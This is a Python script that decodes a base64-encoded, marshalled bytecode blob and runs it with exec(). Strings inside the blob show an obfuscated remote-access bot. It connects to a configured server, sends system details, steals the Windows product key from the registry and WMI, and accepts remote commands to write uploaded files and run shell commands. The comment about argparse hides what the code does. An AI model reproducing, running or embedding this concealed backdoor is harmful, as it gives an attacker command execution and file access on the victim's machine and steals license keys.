import marshal, base64

def run_encrypted():
    data = base64.b64decode('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')
    code = marshal.loads(data)
    exec(code, globals())  # Use globals so imports like argparse work properly

if __name__ == '__main__':
    run_encrypted()
